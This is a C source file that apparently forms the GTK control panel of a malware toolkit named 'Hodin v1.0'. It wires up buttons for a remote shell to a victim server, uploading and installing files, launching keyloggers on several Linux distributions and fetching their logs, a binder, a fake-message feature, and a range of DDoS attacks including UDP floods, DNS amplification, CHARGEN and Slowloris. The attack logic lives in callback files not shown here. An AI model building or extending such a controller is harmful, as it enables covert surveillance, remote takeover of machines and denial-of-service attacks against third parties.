#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"

#include "../includes/callbacks_main.h"
#include "../includes/callbacks_keyloggers.h"
#include "../includes/callbacks_remote_shell.h"
#include "../includes/callbacks_ddos.h"



GtkWidget *main_win = NULL;

GtkWidget *text_view = NULL;

GtkWidget *upload_entry = NULL;

GtkWidget *rs_text_view = NULL;

GtkWidget *ddos_text_view = NULL;

int main(int argc, char *argv[])
{
    /* Initialize GTK */
    gtk_init(&argc, &argv);

    main_win = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(main_win), "Hodin v1.0");
    gtk_window_set_default_size(GTK_WINDOW(main_win), 1280, 600);
    gtk_window_set_resizable(GTK_WINDOW(main_win), FALSE);
    g_signal_connect(main_win, "destroy", gtk_main_quit, NULL);

    fill_window(argv);

    gtk_widget_show_all(main_win);

    gtk_main();

    return EXIT_SUCCESS;
}

void fill_window(char *argv[])
{
    /** Tabs vars **/
    GtkWidget *note_book = {NULL};
    GtkWidget *tab_label[6] = {NULL};;
    GtkWidget *background[6] = {NULL};
    GtkWidget *image_decoration[6] = {NULL};
    GtkWidget *texte_decoration[6] = {NULL};

    gchar *main_tab_label = NULL;
    gchar *remote_shell_tab_label = NULL;
    gchar *ddos_tab_label = NULL;
    gchar *forth_tab_label = NULL;
    gchar *fith_tab_label = NULL;
    gchar *sixth_tab_label = NULL;

    /** General Vars **/
    GtkWidget *frame[32] = {NULL};
    GtkWidget *zone[6] = {NULL};

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    /** Frame 0 Vars **/
    GtkWidget *ip_server = NULL;
    GtkWidget *port_server = NULL;
    GtkWidget *IP_button = NULL;
    GtkWidget *port_button = NULL;

    //GtkWidget *upload_entry = NULL;
    GtkWidget *browse_button = NULL;
    GtkWidget *upload_files = NULL;
    GtkWidget *download_files = NULL;

    /** Keylogger Vars **/
    GtkWidget *run_keylogger = NULL;
    GtkWidget *log_file = NULL;

    /** Logs View vars **/
    //GtkWidget *text_view = NULL;
    GtkWidget *scrollbar = NULL;

    /** DDOS vars **/
    //GtkWidget *ddos_text_view = NULL;
    GtkWidget *ddos_scrollbar = NULL;

    GtkWidget *run_udp_script_1 = NULL;
    GtkWidget *run_udp_script_2 = NULL;
    GtkWidget *run_udp_lag_script = NULL;

    GtkWidget *ssyn_send_script = NULL;
    GtkWidget *essyn_send_script = NULL;
    GtkWidget *chargen_send_script = NULL;

    GtkWidget *rudy_send_script = NULL;
    GtkWidget *arme_send_script = NULL;
    GtkWidget *get_send_script = NULL;
    GtkWidget *head_send_script = NULL;
    GtkWidget *post_send_script = NULL;
    GtkWidget *slowloris_send_script = NULL;

    /** Hosts file **/
    GtkWidget *download_hosts_files = NULL;
    GtkWidget *open_hosts_files = NULL;

    /** Remote shell vars **/
    GtkWidget *rs_entry = NULL;
    GtkWidget *rs_start = NULL;
    GtkWidget *rs_send = NULL;

    //GtkWidget *rs_text_view = NULL;
    GtkWidget *rs_scrollbar = NULL;

    /** Initialize the zone[0] for blit widgets **/
    zone[0] = gtk_fixed_new();
    zone[1] = gtk_fixed_new();
    zone[2] = gtk_fixed_new();
    zone[3] = gtk_fixed_new();
    zone[4] = gtk_fixed_new();
    zone[5] = gtk_fixed_new();

    /*  Creating tabs */
    note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(main_win), note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(note_book), GTK_POS_TOP);

    /* Create tab's labels */
    main_tab_label = g_strdup_printf("Main");
    remote_shell_tab_label = g_strdup_printf("Remote Shell");
    ddos_tab_label = g_strdup_printf("DDOS");
    forth_tab_label = g_strdup_printf("Binder");
    fith_tab_label = g_strdup_printf("fifth");
    sixth_tab_label = g_strdup_printf("sixth");

    /** Load decoration image **/
    background[0] = gtk_image_new_from_file("images/main_BG.jpg");
    background[1] = gtk_image_new_from_file("images/remote_shell_BG.jpg");
    background[2] = gtk_image_new_from_file("images/main_BG.jpg");
    background[3] = gtk_image_new_from_file("images/main_BG.jpg");
    background[4] = gtk_image_new_from_file("images/main_BG.jpg");
    //background[5] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");

    image_decoration[0] = gtk_image_new_from_file("images/crane2.png");
    //image_decoration[1] = gtk_image_new_from_file("images/crane2.png");
    image_decoration[2] = gtk_image_new_from_file("images/Celtic-Art.png");
    //image_decoration[3] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");
    //image_decoration[4] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");
    //image_decoration[5] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");

    texte_decoration[0] = gtk_image_new_from_file("images/banniere.png");
    texte_decoration[1] = gtk_image_new_from_file("images/banniere.png");
    texte_decoration[2] = gtk_image_new_from_file("images/banniere.png");
    //texte_decoration[3] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");
    //texte_decoration[4] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");
    //texte_decoration[5] = gtk_image_new_from_file("IMG/1456576-ghost-in-the-shell_resize.jpg");

    tab_label[0] = gtk_label_new(main_tab_label);
    tab_label[1] = gtk_label_new(remote_shell_tab_label);
    tab_label[2] = gtk_label_new(ddos_tab_label);
    tab_label[3] = gtk_label_new(forth_tab_label);
    tab_label[4] = gtk_label_new(fith_tab_label);
    tab_label[5] = gtk_label_new(sixth_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[0], tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[1], tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[2], tab_label[2]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[3], tab_label[3]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[4], tab_label[4]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), zone[5], tab_label[5]);

    /* Insert background of the tab pages */
    gtk_fixed_put(GTK_FIXED(zone[0]), background[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[1]), background[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[2]), background[2], 0, 0);
    gtk_fixed_put(GTK_FIXED(zone[3]), background[3], 0, 0);
    //gtk_fixed_put(GTK_FIXED(zone[4]), background[4], 15, 10);
    //gtk_fixed_put(GTK_FIXED(zone[5]), background[5], 15, 10);

    /* Insert image of the tab pages */
    gtk_fixed_put(GTK_FIXED(zone[0]), image_decoration[0], 30, 10);
    //gtk_fixed_put(GTK_FIXED(zone[1]), image_decoration[1], 30, 10);
    gtk_fixed_put(GTK_FIXED(zone[2]), image_decoration[2], 145, 440);
    //gtk_fixed_put(GTK_FIXED(zone[3]), image_decoration[3], 15, 10);
    //gtk_fixed_put(GTK_FIXED(zone[4]), image_decoration[4], 15, 10);
    //gtk_fixed_put(GTK_FIXED(zone[5]), image_decoration[5], 15, 10);

    /** Insert text decoration **/
    gtk_fixed_put(GTK_FIXED(zone[0]), texte_decoration[0], 255, 250);
    gtk_fixed_put(GTK_FIXED(zone[1]), texte_decoration[1], 370, 360);
    gtk_fixed_put(GTK_FIXED(zone[2]), texte_decoration[2], 1020, 433);
    //gtk_fixed_put(GTK_FIXED(zone[3]), texte_decoration[3], 270, 260);
    //gtk_fixed_put(GTK_FIXED(zone[4]), texte_decoration[4], 270, 260);
    //gtk_fixed_put(GTK_FIXED(zone[5]), texte_decoration[5], 270, 260);

    /** TAB : Main **/

    /** Frame 0 (Connection) **/
    frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[0]), "- Setup / Upload / Install -");
    gtk_frame_set_label_align(GTK_FRAME(frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[0], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[0], 250, 10);

    upload_entry = gtk_entry_new_with_max_length(40);
    gtk_entry_set_text(GTK_ENTRY(upload_entry), "Upload files or install applications");
    gtk_widget_set_size_request(upload_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), upload_entry, 270, 150);

    ip_server = gtk_entry_new_with_max_length(15);
    gtk_entry_set_text(GTK_ENTRY(ip_server), "Server IP");
    gtk_widget_set_size_request(ip_server, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), ip_server, 270, 100);

    port_server = gtk_entry_new_with_max_length(5);
    gtk_entry_set_text(GTK_ENTRY(port_server), "4444");
    gtk_widget_set_size_request(port_server, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), port_server, 410, 100);

    IP_button = gtk_button_new_with_label("Set Server IP");
    gtk_widget_set_size_request(IP_button, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), IP_button, 270 , 50);
    g_signal_connect(G_OBJECT(IP_button), "clicked", G_CALLBACK(cb_get_server_ip), ip_server);

    port_button = gtk_button_new_with_label("Set Port");
    gtk_widget_set_size_request(port_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), port_button, 410, 50);
    g_signal_connect(G_OBJECT(port_button), "clicked", G_CALLBACK(cb_get_server_port), port_server);

    browse_button = gtk_button_new_with_label("Browse");
    gtk_widget_set_size_request(browse_button, 105, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), browse_button, 520 , 150);
    g_signal_connect(G_OBJECT(browse_button), "clicked", G_CALLBACK(cb_open_file), upload_entry);

    download_files = gtk_button_new_with_label("Download");
    gtk_widget_set_size_request(download_files, 105, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), download_files, 640 , 100);
    g_signal_connect(G_OBJECT(download_files), "clicked", G_CALLBACK(cb_files_downloader), NULL);

    download_hosts_files = gtk_button_new_with_label("Download Hosts");
    gtk_widget_set_size_request(download_hosts_files, 105, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), download_hosts_files, 640 , 50);
    g_signal_connect(G_OBJECT(download_hosts_files), "clicked", G_CALLBACK(cb_hosts_downloader), NULL);

    open_hosts_files = gtk_button_new_with_label("Open Files");
    gtk_widget_set_size_request(open_hosts_files, 105, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), open_hosts_files, 520 , 50);
    g_signal_connect(G_OBJECT(open_hosts_files), "clicked", G_CALLBACK(cb_open_hosts), argv[0]);

    upload_files = gtk_button_new_with_label("Upload / Install");
    gtk_widget_set_size_request(upload_files, 105, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), upload_files, 640 , 150);
    g_signal_connect(G_OBJECT(upload_files), "clicked", G_CALLBACK(cb_files_uploader), NULL);

    /** Frame 1 (KeyLogger) **/
    frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[1]), "- KeyLogger - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[1], 230, 370);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[1], 10, 220);

    run_keylogger = gtk_button_new_with_label("Ubuntu 16.04 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 260);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_ubuntu16_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Ubuntu 18 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 300);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_ubuntu18_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Mint 19 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 340);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_mint_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Debian 9.6 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 380);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_debian_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Kali 2.0 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 420);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_kali_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Fedora 28 Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), run_keylogger, 50, 460);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(cb_fedora_run_the_keylogger), NULL);

    log_file = gtk_button_new_with_label("Logs file");
    gtk_widget_set_size_request(log_file, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone[0]), log_file, 50, 530);
    g_signal_connect(G_OBJECT(log_file), "clicked", G_CALLBACK(cb_download_log_file), NULL);

    /** Frame 2 (Logs) **/
    frame[2] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[2]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[2]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[2]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[2], 540, 190);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[2], 250, 400);

    /** scrolled window on the side of the windows **/
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone[0]), scrollbar, 260, 420);
    gtk_widget_set_size_request(scrollbar, 520, 157);

    /** Side window (log) **/
    text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(text_view, 320, 400);

    /** TAB : Remote Shell **/

    /** Frame 31 (Remote Shell Logs) **/
    frame[31] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[31]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[31]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[31]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[31], 300, 400);
    gtk_fixed_put(GTK_FIXED(zone[1]), frame[31], 960, 50);

    /** scrolled window on the side of the windows **/
    rs_scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_scrollbar, 970, 70);
    gtk_widget_set_size_request(rs_scrollbar, 280, 370);

    /** Side window (log) **/
    rs_text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(rs_scrollbar), rs_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(rs_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(rs_text_view, 320, 400);

    /** Remote shell definition **/

    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(rs_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Remote Shell :\n\
-------------------\n\
\"The remote shell (rsh) is a command line\n\
computer program that can execute shell\n\
commands as another user, and on another\n\
computer across a computer network.\"", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    g_free(text);

    /* GtkEntry for enter the commands */
    rs_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(rs_entry), "Use quit command for exit ...");
    gtk_widget_set_size_request (rs_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_entry, 50, 50);

    /* Start Remote Shell Button */
    rs_start =  gtk_button_new_with_label("Start the Remote Shell");
    gtk_widget_set_size_request(rs_start, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_start, 50, 110);
    g_signal_connect(G_OBJECT(rs_start), "clicked", G_CALLBACK(cb_start_remote_shell), NULL);

    /* Send button */
    rs_send = gtk_button_new_with_label("Send");
    gtk_widget_set_size_request(rs_send, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone[1]), rs_send, 310, 50);
    g_signal_connect(G_OBJECT(rs_send), "clicked", G_CALLBACK(cb_send_cmd), rs_entry);


    /** TAB : DDOS **/

    /** Frame 3 (DDOS) **/
    frame[3] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[3]), "- General Attacks - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[3]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[3]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[3], 230, 200);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[3], 100, 10);

    run_udp_script_1 = gtk_button_new_with_label("UDP BASIC 1 DDOS");
    gtk_widget_set_size_request(run_udp_script_1, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_script_1, 115, 50);
    g_signal_connect(G_OBJECT(run_udp_script_1), "clicked", G_CALLBACK(cb_udp_ddos_script_1), NULL);

    run_udp_script_2 = gtk_button_new_with_label("UDP BASIC 2 DDOS");
    gtk_widget_set_size_request(run_udp_script_2, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_script_2, 115, 100);
    g_signal_connect(G_OBJECT(run_udp_script_2), "clicked", G_CALLBACK(cb_udp_ddos_script_2), NULL);

    run_udp_lag_script = gtk_button_new_with_label("UDP POWER DDOS");
    gtk_widget_set_size_request(run_udp_lag_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_lag_script, 115, 150);
    g_signal_connect(G_OBJECT(run_udp_lag_script), "clicked", G_CALLBACK(cb_udp_power_ddos), NULL);

    frame[4] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[4]), "- Specific Attacks - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[4]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[4]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[4], 230, 200);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[4], 430, 10);

    ssyn_send_script = gtk_button_new_with_label("DNS AMP DDOS");
    gtk_widget_set_size_request(ssyn_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), ssyn_send_script, 445, 50);
    g_signal_connect(G_OBJECT(ssyn_send_script), "clicked", G_CALLBACK(cb_dns_amped_ddos), NULL);

    essyn_send_script = gtk_button_new_with_label("ESSYN DDOS");
    gtk_widget_set_size_request(essyn_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), essyn_send_script, 445, 100);
    g_signal_connect(G_OBJECT(essyn_send_script), "clicked", G_CALLBACK(cb_essyn_attack), NULL);

    chargen_send_script = gtk_button_new_with_label("CHARGEN DDOS");
    gtk_widget_set_size_request(chargen_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), chargen_send_script, 445, 150);
    g_signal_connect(G_OBJECT(chargen_send_script), "clicked", G_CALLBACK(cb_chargen_ddos), NULL);

    frame[5] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[5]), "- Web Attacks - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[5], 440, 200);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[5], 750, 10);

    rudy_send_script = gtk_button_new_with_label("RUDY DDOS");
    gtk_widget_set_size_request(rudy_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), rudy_send_script, 760, 50);
    //g_signal_connect(G_OBJECT(rudy_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    arme_send_script = gtk_button_new_with_label("ARME DDOS");
    gtk_widget_set_size_request(arme_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), arme_send_script, 760, 100);
    //g_signal_connect(G_OBJECT(arme_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    get_send_script = gtk_button_new_with_label("GET DDOS");
    gtk_widget_set_size_request(get_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), get_send_script, 760, 150);
    //g_signal_connect(G_OBJECT(get_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    head_send_script = gtk_button_new_with_label("HEAD DDOS");
    gtk_widget_set_size_request(head_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), head_send_script, 980, 50);
    //g_signal_connect(G_OBJECT(head_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    post_send_script = gtk_button_new_with_label("POST DDOS");
    gtk_widget_set_size_request(post_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), post_send_script, 980, 100);
    //g_signal_connect(G_OBJECT(post_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    slowloris_send_script = gtk_button_new_with_label("SLOWLORIS DDOS");
    gtk_widget_set_size_request(slowloris_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), slowloris_send_script, 980, 150);
    //g_signal_connect(G_OBJECT(slowloris_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);

    /** Frame 4 (Logs) **/
    frame[6] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[6]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[6]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[6]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[6], 540, 190);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[6], 370, 400);

    /** scrolled window on the side of the windows **/
    ddos_scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone[2]), ddos_scrollbar, 380, 420);
    gtk_widget_set_size_request(ddos_scrollbar, 520, 157);

    /** Side window (log) **/
    ddos_text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(ddos_scrollbar), ddos_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(ddos_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(ddos_text_view, 320, 400);

    /** Fake Message **/
    frame[30] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[30]), "- Fake Message - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[30]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[30]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[30], 430, 580);
    gtk_fixed_put(GTK_FIXED(zone[0]), frame[30], 820, 10);

    return;
}





